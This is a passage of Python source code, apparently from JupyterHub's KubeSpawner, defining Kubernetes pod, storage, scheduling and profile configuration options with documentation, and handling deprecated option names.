needed, and nothing more. When misconfigured, this can easily\n        give arbitrary users root over your entire cluster.\n        \"\"\"\n    )\n\n    pod_name_template = Unicode(\n        'jupyter-{username}{servername}',\n        config=True,\n        help=\"\"\"\n        Template to use to form the name of user's pods.\n\n        `{username}` is expanded to the escaped, dns-label safe username.\n\n        This must be unique within the namespace the pods are being spawned\n        in, so if you are running multiple jupyterhubs spawning in the\n        same namespace, consider setting this to be something more unique.\n        \"\"\"\n    )\n\n    storage_pvc_ensure = Bool(\n        False,\n        config=True,\n        help=\"\"\"\n        Ensure that a PVC exists for each user before spawning.\n\n        Set to true to create a PVC named with `pvc_name_template` if it does\n        not exist for the user when their pod is spawning.\n        \"\"\"\n    )\n\n    pvc_name_template = Unicode(\n        'claim-{username}{servername}',\n        config=True,\n        help=\"\"\"\n        Template to use to form the name of user's pvc.\n\n        `{username}` is expanded to the escaped, dns-label safe username.\n\n        This must be unique within the namespace the pvc are being spawned\n        in, so if you are running multiple jupyterhubs spawning in the\n        same namespace, consider setting this to be something more unique.\n        \"\"\"\n    )\n\n    # FIXME: Don't override 'default_value' (\"\") or 'allow_none' (False) (Breaking change)\n    hub_connect_ip = Unicode(\n        allow_none=True,\n        config=True,\n        help=\"\"\"DEPRECATED. Use c.JupyterHub.hub_connect_ip\"\"\"\n    )\n\n    hub_connect_port = Integer(\n        config=True,\n        help=\"\"\"DEPRECATED. Use c.JupyterHub.hub_connect_url\"\"\"\n    )\n\n    @observe('hub_connect_ip', 'hub_connect_port')\n    def _deprecated_changed(self, change):\n        warnings.warn(\"\"\"\n            KubeSpawner.{0} is deprecated with JupyterHub >= 0.8.\n            Use JupyterHub.{0}\n            \"\"\".format(change.name),\n            DeprecationWarning)\n        setattr(self.hub, change.name.split('_', 1)[1], change.new)\n\n    common_labels = Dict(\n        {\n            'app': 'jupyterhub',\n            'heritage': 'jupyterhub',\n        },\n        config=True,\n        help=\"\"\"\n        Kubernetes labels that both spawned singleuser server pods and created\n        user PVCs will get.\n\n        Note that these are only set when the Pods and PVCs are created, not\n        later when this setting is updated.\n        \"\"\"\n    )\n\n    extra_labels = Dict(\n        config=True,\n        help=\"\"\"\n        Extra kubernetes labels to set on the spawned single-user pods.\n\n        The keys and values specified here would be set as labels on the spawned single-user\n        kubernetes pods. The keys and values must both be strings that match the kubernetes\n        label key / value constraints.\n\n        See `the Kubernetes documentation <https://kubernetes.io/docs/concepts/overview/working-with-objects/labels/>`__\n        for more info on what labels are and why you might want to use them!\n\n        `{username}` is expanded to the escaped, dns-label safe username.\n        \"\"\"\n    )\n\n    extra_annotations = Dict(\n        config=True,\n        help=\"\"\"\n        Extra Kubernetes annotations to set on the spawned single-user pods.\n\n        The keys and values specified here are added as annotations on the spawned single-user\n        kubernetes pods. The keys and values must both be strings.\n\n        See `the Kubernetes documentation <https://kubernetes.io/docs/concepts/overview/working-with-objects/annotations/>`__\n        for more info on what annotations are and why you might want to use them!\n\n        `{username}` is expanded to the escaped, dns-label safe username.\n        \"\"\"\n    )\n\n    image = Unicode(\n        'jupyterhub/singleuser:latest',\n        config=True,\n        help=\"\"\"\n        Docker image to use for spawning user's containers.\n\n        Defaults to `jupyterhub/singleuser:latest`\n\n        Name of the container + a tag, same as would be used with\n        a `docker pull` command. If tag is set to `latest`, kubernetes will\n        check the registry each time a new user is spawned to see if there\n        is a newer image available. If available, new image will be pulled.\n        Note that this could cause long delays when spawning, especially\n        if the image is large. If you do not specify a tag, whatever version\n        of the image is first pulled on the node will be used, thus possibly\n        leading to inconsistent images on different nodes. For all these\n        reasons, it is recommended to specify a specific immutable tag\n        for the image.\n\n        If your image is very large, you might need to increase the timeout\n        for starting the single user container from the default. You can\n        set this with::\n\n           c.KubeSpawner.start_timeout = 60 * 5  # Up to 5 minutes\n\n        \"\"\"\n    )\n\n    image_pull_policy = Unicode(\n        'IfNotPresent',\n        config=True,\n        help=\"\"\"\n        The image pull policy of the docker container specified in\n        `image`.\n\n        Defaults to `IfNotPresent` which causes the Kubelet to NOT pull the image\n        specified in KubeSpawner.image if it already exists, except if the tag\n        is `:latest`. For more information on image pull policy,\n        refer to `the Kubernetes documentation <https://kubernetes.io/docs/concepts/containers/images/>`__.\n\n\n        This configuration is primarily used in development if you are\n        actively changing the `image_spec` and would like to pull the image\n        whenever a user container is spawned.\n        \"\"\"\n    )\n\n    # FIXME: Don't override 'default_value' (\"\") or 'allow_none' (False) (Breaking change)\n    image_pull_secrets = Unicode(\n        None,\n        allow_none=True,\n        config=True,\n        help=\"\"\"\n        The kubernetes secret to use for pulling images from private repository.\n\n        Set this to the name of a Kubernetes secret containing the docker configuration\n        required to pull the image.\n\n        See `the Kubernetes documentation <https://kubernetes.io/docs/concepts/containers/images/#specifying-imagepullsecrets-on-a-pod>`__\n        for more information on when and why this might need to be set, and what\n        it should be set to.\n        \"\"\"\n    )\n\n    node_selector = Dict(\n        config=True,\n        help=\"\"\"\n        The dictionary Selector labels used to match the Nodes where Pods will be launched.\n\n        Default is None and means it will be launched in any available Node.\n\n        For example to match the Nodes that have a label of `disktype: ssd` use::\n\n           c.KubeSpawner.node_selector = {'disktype': 'ssd'}\n        \"\"\"\n    )\n\n    uid = Union(\n        trait_types=[\n            Integer(),\n            Callable(),\n        ],\n        allow_none=True,\n        config=True,\n        help=\"\"\"\n        The UID to run the single-user server containers as.\n\n        This UID should ideally map to a user that already exists in the container\n        image being used. Running as root is discouraged.\n\n        Instead of an integer, this could also be a callable that takes as one\n        parameter the current spawner instance and returns an integer. The callable\n        will be called asynchronously if it returns a future. Note that\n        the interface of the spawner class is not deemed stable across versions,\n        so using this functionality might cause your JupyterHub or kubespawner\n        upgrades to break.\n\n        If set to `None`, the user specified with the `USER` directive in the\n        container metadata is used.\n        \"\"\"\n    )\n\n    gid = Union(\n        trait_types=[\n            Integer(),\n            Callable(),\n        ],\n        allow_none=True,\n        config=True,\n        help=\"\"\"\n        The GID to run the single-user server containers as.\n\n        This GID should ideally map to a group that already exists in the container\n        image being used. Running as root is discouraged.\n\n        Instead of an integer, this could also be a callable that takes as one\n        parameter the current spawner instance and returns an integer. The callable\n        will be called asynchronously if it returns a future. Note that\n        the interface of the spawner class is not deemed stable across versions,\n        so using this functionality might cause your JupyterHub or kubespawner\n        upgrades to break.\n\n        If set to `None`, the group of the user specified with the `USER` directive\n        in the container metadata is used.\n        \"\"\"\n    )\n\n    fs_gid = Union(\n        trait_types=[\n            Integer(),\n            Callable(),\n        ],\n        allow_none=True,\n        config=True,\n        help=\"\"\"\n        The GID of the group that should own any volumes that are created & mounted.\n\n        A special supplemental group that applies primarily to the volumes mounted\n        in the single-user server. In volumes from supported providers, the following\n        things happen:\n\n          1. The owning GID will be the this GID\n          2. The setgid bit is set (new files created in the volume will be owned by\n             this GID)\n          3. The permission bits are OR\u2019d with rw-rw\n\n        The single-user server will also be run with this gid as part of its supplemental\n        groups.\n\n        Instead of an integer, this could also be a callable that takes as one\n        parameter the current spawner instance and returns an integer. The callable will\n        be called asynchronously if it returns a future, rather than an int. Note that\n        the interface of the spawner class is not deemed stable across versions,\n        so using this functionality might cause your JupyterHub or kubespawner\n        upgrades to break.\n\n        You'll *have* to set this if you are using auto-provisioned volumes with most\n        cloud providers. See `fsGroup <https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#podsecuritycontext-v1-core>`_\n        for more details.\n        \"\"\"\n    )\n\n    supplemental_gids = Union(\n        trait_types=[\n            List(),\n            Callable(),\n        ],\n        config=True,\n        help=\"\"\"\n        A list of GIDs that should be set as additional supplemental groups to the\n        user that the container runs as.\n\n        Instead of a list of integers, this could also be a callable that takes as one\n        parameter the current spawner instance and returns a list of integers. The\n        callable will be called asynchronously if it returns a future, rather than\n        a list. Note that the interface of the spawner class is not deemed stable\n        across versions, so using this functionality might cause your JupyterHub\n        or kubespawner upgrades to break.\n\n        You may have to set this if you are deploying to an environment with RBAC/SCC\n        enforced and pods run with a 'restricted' SCC which results in the image being\n        run as an assigned user ID. The supplemental group IDs would need to include\n        the corresponding group ID of the user ID the image normally would run as. The\n        image must setup all directories/files any application needs access to, as group\n        writable.\n        \"\"\"\n    )\n\n    privileged = Bool(\n        False,\n        config=True,\n        help=\"\"\"\n        Whether to run the pod with a privileged security context.\n        \"\"\"\n    )\n\n    modify_pod_hook = Callable(\n        None,\n        allow_none=True,\n        config=True,\n        help=\"\"\"\n        Callable to augment the Pod object before launching.\n\n        Expects a callable that takes two parameters:\n\n           1. The spawner object that is doing the spawning\n           2. The Pod object that is to be launched\n\n        You should modify the Pod object and return it.\n\n        This can be a coroutine if necessary. When set to none, no augmenting is done.\n\n        This is very useful if you want to modify the pod being launched dynamically.\n        Note that the spawner object can change between versions of KubeSpawner and JupyterHub,\n        so be careful relying on this!\n        \"\"\"\n    )\n\n    volumes = List(\n        config=True,\n        help=\"\"\"\n        List of Kubernetes Volume specifications that will be mounted in the user pod.\n\n        This list will be directly added under `volumes` in the kubernetes pod spec,\n        so you should use the same structure. Each item in the list must have the\n        following two keys:\n\n          - `name`\n            Name that'll be later used in the `volume_mounts` config to mount this\n            volume at a specific path.\n          - `<name-of-a-supported-volume-type>` (such as `hostPath`, `persistentVolumeClaim`,\n            etc)\n            The key name determines the type of volume to mount, and the value should\n            be an object specifying the various options available for that kind of\n            volume.\n\n        See `the Kubernetes documentation <https://kubernetes.io/docs/concepts/storage/volumes>`__\n        for more information on the various kinds of volumes available and their options.\n        Your kubernetes cluster must already be configured to support the volume types you want to use.\n\n        `{username}` is expanded to the escaped, dns-label safe username.\n        \"\"\"\n    )\n\n    volume_mounts = List(\n        config=True,\n        help=\"\"\"\n        List of paths on which to mount volumes in the user notebook's pod.\n\n        This list will be added to the values of the `volumeMounts` key under the user's\n        container in the kubernetes pod spec, so you should use the same structure as that.\n        Each item in the list should be a dictionary with at least these two keys:\n\n           - `mountPath` The path on the container in which we want to mount the volume.\n           - `name` The name of the volume we want to mount, as specified in the `volumes` config.\n\n        See `the Kubernetes documentation <https://kubernetes.io/docs/concepts/storage/volumes>`__\n        for more information on how the `volumeMount` item works.\n\n        `{username}` is expanded to the escaped, dns-label safe username.\n        \"\"\"\n    )\n\n    # FIXME: Don't override 'default_value' (\"\") or 'allow_none' (False) (Breaking change)\n    storage_capacity = Unicode(\n        None,\n        config=True,\n        allow_none=True,\n        help=\"\"\"\n        The amount of storage space to request from the volume that the pvc will\n        mount to. This amount will be the amount of storage space the user has\n        to work with on their notebook. If left blank, the kubespawner will not\n        create a pvc for the pod.\n\n        This will be added to the `resources: requests: storage:` in the k8s pod spec.\n\n        See `the Kubernetes documentation <https://kubernetes.io/docs/concepts/storage/persistent-volumes/#persistentvolumeclaims>`__\n        for more information on how storage works.\n\n        Quantities can be represented externally as unadorned integers, or as fixed-point\n        integers with one of these SI suffices (`E, P, T, G, M, K, m`) or their power-of-two\n        equivalents (`Ei, Pi, Ti, Gi, Mi, Ki`). For example, the following represent roughly\n        the same value: `128974848`, `129e6`, `129M`, `123Mi`.\n        \"\"\"\n    )\n\n    storage_extra_labels = Dict(\n        config=True,\n        help=\"\"\"\n        Extra kubernetes labels to set on the user PVCs.\n\n        The keys and values specified here would be set as labels on the PVCs\n        created by kubespawner for the user. Note that these are only set\n        when the PVC is created, not later when this setting is updated.\n\n        See `the Kubernetes documentation <https://kubernetes.io/docs/concepts/overview/working-with-objects/labels/>`__\n        for more info on what labels are and why you might want to use them!\n\n        `{username}` is expanded to the escaped, dns-label safe username.\n        \"\"\"\n    )\n\n    # FIXME: Don't override 'default_value' (\"\") or 'allow_none' (False) (Breaking change)\n    storage_class = Unicode(\n        None,\n        config=True,\n        allow_none=True,\n        help=\"\"\"\n        The storage class that the pvc will use.\n\n        This will be added to the `annotations: volume.beta.kubernetes.io/storage-class:`\n        in the pvc metadata.\n\n        This will determine what type of volume the pvc will request to use. If one exists\n        that matches the criteria of the StorageClass, the pvc will mount to that. Otherwise,\n        b/c it has a storage class, k8s will dynamically spawn a pv for the pvc to bind to\n        and a machine in the cluster for the pv to bind to.\n\n        Note that an empty string is a valid value and is always interpreted to be\n        requesting a pv with no class.\n\n        See `the Kubernetes documentation <https://kubernetes.io/docs/concepts/storage/storage-classes/>`__\n        for more information on how StorageClasses work.\n\n        \"\"\"\n    )\n\n    storage_access_modes = List(\n        [\"ReadWriteOnce\"],\n        config=True,\n        help=\"\"\"\n        List of access modes the user has for the pvc.\n\n        The access modes are:\n\n            - `ReadWriteOnce` \u2013 the volume can be mounted as read-write by a single node\n            - `ReadOnlyMany` \u2013 the volume can be mounted read-only by many nodes\n            - `ReadWriteMany` \u2013 the volume can be mounted as read-write by many nodes\n\n        See `the Kubernetes documentation <https://kubernetes.io/docs/concepts/storage/persistent-volumes/#access-modes>`__\n        for more information on how access modes work.\n        \"\"\"\n    )\n\n    storage_selector = Dict(\n        config=True,\n        help=\"\"\"\n        The dictionary Selector labels used to match a PersistentVolumeClaim to\n        a PersistentVolume.\n\n        Default is None and means it will match based only on other storage criteria.\n\n        For example to match the Nodes that have a label of `content: jupyter` use::\n\n           c.KubeSpawner.storage_selector = {'matchLabels':{'content': 'jupyter'}}\n        \"\"\"\n    )\n\n    lifecycle_hooks = Dict(\n        config=True,\n        help=\"\"\"\n        Kubernetes lifecycle hooks to set on the spawned single-user pods.\n\n        The keys is name of hooks and there are only two hooks, postStart and preStop.\n        The values are handler of hook which executes by Kubernetes management system when hook is called.\n\n        Below is an sample copied from\n        `the Kubernetes documentation <https://kubernetes.io/docs/tasks/configure-pod-container/attach-handler-lifecycle-event/>`__::\n\n\n            c.KubeSpawner.lifecycle_hooks = {\n                \"postStart\": {\n                    \"exec\": {\n                        \"command\": [\"/bin/sh\", \"-c\", \"echo Hello from the postStart handler > /usr/share/message\"]\n                    }\n                },\n                \"preStop\": {\n                    \"exec\": {\n                        \"command\": [\"/usr/sbin/nginx\", \"-s\", \"quit\"]\n                    }\n                }\n            }\n\n        See `the Kubernetes documentation <https://kubernetes.io/docs/concepts/containers/container-lifecycle-hooks/>`__\n        for more info on what lifecycle hooks are and why you might want to use them!\n        \"\"\"\n    )\n\n    init_containers = List(\n        config=True,\n        help=\"\"\"\n        List of initialization containers belonging to the pod.\n\n        This list will be directly added under `initContainers` in the kubernetes pod spec,\n        so you should use the same structure. Each item in the dict must a field\n        of the `V1Container specification <https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#container-v1-core>`_.\n\n        One usage is disabling access to metadata service from single-user\n        notebook server with configuration below::\n\n            c.KubeSpawner.init_containers = [{\n                \"name\": \"init-iptables\",\n                \"image\": \"<image with iptables installed>\",\n                \"command\": [\"iptables\", \"-A\", \"OUTPUT\", \"-p\", \"tcp\", \"--dport\", \"80\", \"-d\", \"169.254.169.254\", \"-j\", \"DROP\"],\n                \"securityContext\": {\n                    \"capabilities\": {\n                        \"add\": [\"NET_ADMIN\"]\n                    }\n                }\n            }]\n\n\n        See `the Kubernetes documentation <https://kubernetes.io/docs/concepts/workloads/pods/init-containers/>`__\n        for more info on what init containers are and why you might want to use them!\n\n        To user this feature, Kubernetes version must greater than 1.6.\n        \"\"\"\n    )\n\n    extra_container_config = Dict(\n        config=True,\n        help=\"\"\"\n        Extra configuration (e.g. ``envFrom``) for notebook container which is not covered by other attributes.\n\n        This dict will be directly merge into `container` of notebook server,\n        so you should use the same structure. Each item in the dict must a field\n        of the `V1Container specification <https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#container-v1-core>`_.\n\n        One usage is set ``envFrom`` on notebook container with configuration below::\n\n            c.KubeSpawner.extra_container_config = {\n                \"envFrom\": [{\n                    \"configMapRef\": {\n                        \"name\": \"special-config\"\n                    }\n                }]\n            }\n\n        The key could be either a camelCase word (used by Kubernetes yaml, e.g.\n        ``envFrom``) or a snake_case word (used by Kubernetes Python client,\n        e.g. ``env_from``).\n        \"\"\"\n    )\n\n    extra_pod_config = Dict(\n        config=True,\n        help=\"\"\"\n        Extra configuration for the pod which is not covered by other attributes.\n\n        This dict will be directly merge into pod,so you should use the same structure.\n        Each item in the dict is field of pod configuration\n        which follows spec at https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#podspec-v1-core.\n\n        One usage is set restartPolicy and dnsPolicy with configuration below::\n\n            c.KubeSpawner.extra_pod_config = {\n                \"restartPolicy\": \"OnFailure\",\n                \"dns_policy\": \"ClusterFirstWithHostNet\"\n            }\n\n        The `key` could be either a camelCase word (used by Kubernetes yaml,\n        e.g. `restartPolicy`) or a snake_case word (used by Kubernetes Python\n        client, e.g. `dns_policy`).\n        \"\"\"\n    )\n\n    extra_containers = List(\n        config=True,\n        help=\"\"\"\n        List of containers belonging to the pod which besides to the container generated for notebook server.\n\n        This list will be directly appended under `containers` in the kubernetes pod spec,\n        so you should use the same structure. Each item in the list is container configuration\n        which follows spec at https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#container-v1-core.\n\n        One usage is setting crontab in a container to clean sensitive data with configuration below::\n\n            c.KubeSpawner.extra_containers = [{\n                \"name\": \"crontab\",\n                \"image\": \"supercronic\",\n                \"command\": [\"/usr/local/bin/supercronic\", \"/etc/crontab\"]\n            }]\n\n        `{username}` is expanded to the escaped, dns-label safe username.\n        \"\"\"\n    )\n\n    # FIXME: Don't override 'default_value' (\"\") or 'allow_none' (False) (Breaking change)\n    scheduler_name = Unicode(\n        None,\n        allow_none=True,\n        config=True,\n        help=\"\"\"\n        Set the pod's scheduler explicitly by name. See `the Kubernetes documentation <https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#podspec-v1-core>`__\n        for more information.\n        \"\"\"\n    )\n\n    tolerations = List(\n        config=True,\n        help=\"\"\"\n        List of tolerations that are to be assigned to the pod in order to be able to schedule the pod\n        on a node with the corresponding taints. See the official Kubernetes documentation for additional details\n        https://kubernetes.io/docs/concepts/configuration/taint-and-toleration/\n\n        Pass this field an array of `\"Toleration\" objects\n        <https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#nodeselectorterm-v1-core>`__\n\n        Example::\n\n            [\n                {\n                    'key': 'key',\n                    'operator': 'Equal',\n                    'value': 'value',\n                    'effect': 'NoSchedule'\n                },\n                {\n                    'key': 'key',\n                    'operator': 'Exists',\n                    'effect': 'NoSchedule'\n                }\n            ]\n\n        \"\"\"\n    )\n\n    node_affinity_preferred = List(\n        config=True,\n        help=\"\"\"\n        Affinities describe where pods prefer or require to be scheduled, they\n        may prefer or require a node to have a certain label or be in proximity\n        / remoteness to another pod. To learn more visit\n        https://kubernetes.io/docs/concepts/configuration/assign-pod-node/\n\n        Pass this field an array of \"PreferredSchedulingTerm\" objects.*\n        * https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#preferredschedulingterm-v1-core\n        \"\"\"\n    )\n    node_affinity_required = List(\n        config=True,\n        help=\"\"\"\n        Affinities describe where pods prefer or require to be scheduled, they\n        may prefer or require a node to have a certain label or be in proximity\n        / remoteness to another pod. To learn more visit\n        https://kubernetes.io/docs/concepts/configuration/assign-pod-node/\n\n        Pass this field an array of \"NodeSelectorTerm\" objects.*\n        * https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#nodeselectorterm-v1-core\n        \"\"\"\n    )\n    pod_affinity_preferred = List(\n        config=True,\n        help=\"\"\"\n        Affinities describe where pods prefer or require to be scheduled, they\n        may prefer or require a node to have a certain label or be in proximity\n        / remoteness to another pod. To learn more visit\n        https://kubernetes.io/docs/concepts/configuration/assign-pod-node/\n\n        Pass this field an array of \"WeightedPodAffinityTerm\" objects.*\n        * https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#weightedpodaffinityterm-v1-core\n        \"\"\"\n    )\n    pod_affinity_required = List(\n        config=True,\n        help=\"\"\"\n        Affinities describe where pods prefer or require to be scheduled, they\n        may prefer or require a node to have a certain label or be in proximity\n        / remoteness to another pod. To learn more visit\n        https://kubernetes.io/docs/concepts/configuration/assign-pod-node/\n\n        Pass this field an array of \"PodAffinityTerm\" objects.*\n        * https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#podaffinityterm-v1-core\n        \"\"\"\n    )\n    pod_anti_affinity_preferred = List(\n        config=True,\n        help=\"\"\"\n        Affinities describe where pods prefer or require to be scheduled, they\n        may prefer or require a node to have a certain label or be in proximity\n        / remoteness to another pod. To learn more visit\n        https://kubernetes.io/docs/concepts/configuration/assign-pod-node/\n\n        Pass this field an array of \"WeightedPodAffinityTerm\" objects.*\n        * https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#weightedpodaffinityterm-v1-core\n        \"\"\"\n    )\n    pod_anti_affinity_required = List(\n        config=True,\n        help=\"\"\"\n        Affinities describe where pods prefer or require to be scheduled, they\n        may prefer or require a node to have a certain label or be in proximity\n        / remoteness to another pod. To learn more visit\n        https://kubernetes.io/docs/concepts/configuration/assign-pod-node/\n\n        Pass this field an array of \"PodAffinityTerm\" objects.*\n        * https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#podaffinityterm-v1-core\n        \"\"\"\n    )\n\n    extra_resource_guarantees = Dict(\n        config=True,\n        help=\"\"\"\n        The dictionary used to request arbitrary resources.\n        Default is None and means no additional resources are requested.\n        For example, to request 1 Nvidia GPUs::\n\n            c.KubeSpawner.extra_resource_guarantees = {\"nvidia.com/gpu\": \"1\"}\n        \"\"\"\n    )\n\n    extra_resource_limits = Dict(\n        config=True,\n        help=\"\"\"\n        The dictionary used to limit arbitrary resources.\n        Default is None and means no additional resources are limited.\n        For example, to add a limit of 3 Nvidia GPUs::\n\n            c.KubeSpawner.extra_resource_limits = {\"nvidia.com/gpu\": \"3\"}\n        \"\"\"\n    )\n\n    delete_stopped_pods = Bool(\n        True,\n        config=True,\n        help=\"\"\"\n        Whether to delete pods that have stopped themselves.\n        Set to False to leave stopped pods in the completed state,\n        allowing for easier debugging of why they may have stopped.\n        \"\"\"\n    )\n\n    profile_form_template = Unicode(\n        \"\"\"\n        <script>\n        // JupyterHub 0.8 applied form-control indisciminately to all form elements.\n        // Can be removed once we stop supporting JupyterHub 0.8\n        $(document).ready(function() {\n            $('#kubespawner-profiles-list input[type=\"radio\"]').removeClass('form-control');\n        });\n        </script>\n        <style>\n        /* The profile description should not be bold, even though it is inside the <label> tag */\n        #kubespawner-profiles-list label p {\n            font-weight: normal;\n        }\n        </style>\n\n        <div class='form-group' id='kubespawner-profiles-list'>\n        {% for profile in profile_list %}\n        <label for='profile-item-{{ profile.slug }}' class='form-control input-group'>\n            <div class='col-md-1'>\n                <input type='radio' name='profile' id='profile-item-{{ profile.slug }}' value='{{ profile.slug }}' {% if profile.default %}checked{% endif %} />\n            </div>\n            <div class='col-md-11'>\n                <strong>{{ profile.display_name }}</strong>\n                {% if profile.description %}\n                <p>{{ profile.description }}</p>\n                {% endif %}\n            </div>\n        </label>\n        {% endfor %}\n        </div>\n        \"\"\",\n        config=True,\n        help=\"\"\"\n        Jinja2 template for constructing profile list shown to user.\n\n        Used when `profile_list` is set.\n\n        The contents of `profile_list` are passed in to the template.\n        This should be used to construct the contents of a HTML form. When\n        posted, this form is expected to have an item with name `profile` and\n        the value the index of the profile in `profile_list`.\n        \"\"\"\n    )\n\n    profile_list = Union(\n        trait_types=[\n            List(trait=Dict()),\n            Callable()\n        ],\n        config=True,\n        help=\"\"\"\n        List of profiles to offer for selection by the user.\n\n        Signature is: `List(Dict())`, where each item is a dictionary that has two keys:\n\n        - `display_name`: the human readable display name (should be HTML safe)\n        - `slug`: the machine readable slug to identify the profile\n          (missing slugs are generated from display_name)\n        - `description`: Optional description of this profile displayed to the user.\n        - `kubespawner_override`: a dictionary with overrides to apply to the KubeSpawner\n          settings. Each value can be either the final value to change or a callable that\n          take the `KubeSpawner` instance as parameter and return the final value.\n        - `default`: (optional Bool) True if this is the default selected option\n\n        Example::\n\n            c.KubeSpawner.profile_list = [\n                {\n                    'display_name': 'Training Env - Python',\n                    'slug': 'training-python',\n                    'default': True,\n                    'kubespawner_override': {\n                        'image': 'training/python:label',\n                        'cpu_limit': 1,\n                        'mem_limit': '512M',\n                    }\n                }, {\n                    'display_name': 'Training Env - Datascience',\n                    'slug': 'training-datascience',\n                    'kubespawner_override': {\n                        'image': 'training/datascience:label',\n                        'cpu_limit': 4,\n                        'mem_limit': '8G',\n                    }\n                }, {\n                    'display_name': 'DataScience - Small instance',\n                    'slug': 'datascience-small',\n                    'kubespawner_override': {\n                        'image': 'datascience/small:label',\n                        'cpu_limit': 10,\n                        'mem_limit': '16G',\n                    }\n                }, {\n                    'display_name': 'DataScience - Medium instance',\n                    'slug': 'datascience-medium',\n                    'kubespawner_override': {\n                        'image': 'datascience/medium:label',\n                        'cpu_limit': 48,\n                        'mem_limit': '96G',\n                    }\n                }, {\n                    'display_name': 'DataScience - Medium instance (GPUx2)',\n                    'slug': 'datascience-gpu2x',\n                    'kubespawner_override': {\n                        'image': 'datascience/medium:label',\n                        'cpu_limit': 48,\n                        'mem_limit': '96G',\n                        'extra_resource_guarantees': {\"nvidia.com/gpu\": \"2\"},\n                    }\n                }\n            ]\n\n        Instead of a list of dictionaries, this could also be a callable that takes as one\n        parameter the current spawner instance and returns a list of dictionaries. The\n        callable will be called asynchronously if it returns a future, rather than\n        a list. Note that the interface of the spawner class is not deemed stable\n        across versions, so using this functionality might cause your JupyterHub\n        or kubespawner upgrades to break.\n        \"\"\"\n    )\n\n    priority_class_name = Unicode(\n        config=True,\n        help=\"\"\"\n        The priority class that the pods will use.\n\n        See https://kubernetes.io/docs/concepts/configuration/pod-priority-preemption for\n        more information on how pod priority works.\n        \"\"\"\n    )\n\n    delete_grace_period = Integer(\n        1,\n        config=True,\n        help=\"\"\"\n        Time in seconds for the pod to be in `terminating` state before is forcefully killed.\n        \n        Increase this if you need more time to execute a `preStop` lifecycle hook.\n\n        See https://kubernetes.io/docs/concepts/workloads/pods/pod/#termination-of-pods for\n        more information on how pod termination works.\n\n        Defaults to `1`.\n        \"\"\"\n    )\n\n    # deprecate redundant and inconsistent singleuser_ and user_ prefixes:\n    _deprecated_traits_09 = [\n        \"singleuser_working_dir\",\n        \"singleuser_service_account\",\n        \"singleuser_extra_labels\",\n        \"singleuser_extra_annotations\",\n        \"singleuser_image_spec\",\n        \"singleuser_image_pull_policy\",\n        \"singleuser_image_pull_secrets\",\n        \"singleuser_node_selector\",\n        \"singleuser_uid\",\n        \"singleuser_fs_gid\",\n        \"singleuser_supplemental_gids\",\n        \"singleuser_privileged\",\n        \"singleuser_lifecycle_hooks\",\n        \"singleuser_extra_pod_config\",\n        \"singleuser_init_containers\",\n        \"singleuser_extra_container_config\",\n        \"singleuser_extra_containers\",\n        \"user_storage_class\",\n        \"user_storage_pvc_ensure\",\n        \"user_storage_capacity\",\n        \"user_storage_extra_labels\",\n        \"user_storage_access_modes\",\n    ]\n    # other general deprecations:\n    _deprecated_traits = {\n        'image_spec': ('image', '0.10'),\n    }\n    # add the bulk deprecations from 0.9\n    for _deprecated_name in _deprecated_traits_09:\n        _new_name = _deprecated_name.split('_', 1)[1]\n        _deprecated_traits[_deprecated_name] = (_new_name, '0.9')\n\n    @validate('config')\n    def _handle_deprecated_config(self, proposal):\n        config = proposal.value\n        if 'KubeSpawner' not in config:\n            # nothing to check\n            return config\n        for _deprecated_name, (_new_name, version) in self._deprecated_traits.items():\n            # for any `singleuser_name` deprecate in favor of `name`\n            if _deprecated_name not in config.KubeSpawner:\n                # nothing to do\n                continue\n\n            # remove deprecated value from config\n            _deprecated_value = config.KubeSpawner.pop(_deprecated_name)\n            self.log.warning(\n                \"KubeSpawner.%s is deprecated in %s. Use KubeSpawner.%s instead\",\n                _deprecated_name,\n                version,\n                _new_name,\n            )\n            if _new_name in config.KubeSpawner:\n                # *both* config values found,\n                # ignore deprecated config and warn about the collision\n                _new_value = config.KubeSpawner[_new_name]\n                # ignore deprecated config in favor of non-deprecated config\n                self.log.warning(\n                    \"Ignoring deprecated config KubeSpawner.%s = %r \"\n                    \" in favor of KubeSpawner.%s = %r\",\n                    _deprecated_name,\n                    _deprecated_value,\n                    _new_name,\n                    _new_value,\n                )\n            else:\n                # move deprecated config to its new home\n                config.KubeSpawner[_new_name] = _deprecated_value\n\n        return config\n\n    # define properties for deprecated names\n    # so we can propagate their values to the new traits.\n    # most deprecations should be handled via config above,\n    # but in case these are set at runtime, e.g. by subclasses\n    # or hooks, hook this up.\n    # The signature-order of these is funny\n    # because the property methods are created with\n    # functools.partial(f, name) so name is passed as the first arg\n    # before self.\n\n    def _get_deprecated(name, new_name, version, self):\n        # warn about the deprecated name\n        self.log.warning(\n            \"KubeSpawner.%s is deprecated in %s. Use KubeSpawner.%s\",\n            name,\n            version,\n            new_name,\n        )\n        return getattr(self, new_name)\n\n    def _set_deprecated(name, new_name, version, self, value):\n        # warn about the deprecated name\n        self.log.warning(\n            \"KubeSpawner.%s is deprecated in %s. Use KubeSpawner.%s\",\n            name,\n            version,\n            new_name,\n        )\n        return setattr(self, new_name, value)\n\n    for _deprecated_name, (_new_name, _version) in _deprecated_traits.items():\n        exec(\n            \"\"\"{0} = property(\n                partial(_get_deprecated, '{0}', '{1}', '{2}'),\n                partial(_set_deprecated, '{0}', '{1}', '{2}'),\n            )\n            \"\"\".format(\n                _deprecated_name,\n                _new_name,\n                _version,\n            )\n        )\n    del _deprecated_name\n\n    def _expand_user_properties(self, template):\n        # Make sure username and servername match the restrictions for DNS labels\n        # Note: '-' is not in safe_chars, as it is being used as escape character\n        safe_chars = set(string.ascii_lowercase + string.digits)\n\n        # Set servername based on whether named-server initialised\n        if self.name:\n            # use two -- to ensure no collision possibilities\n            # are created by an ambiguous boundary between username and\n            # servername.\n            # -- cannot occur in a string where - is the escape char.\n            servername = '--{}'.format(self.name)\n            safe_servername = 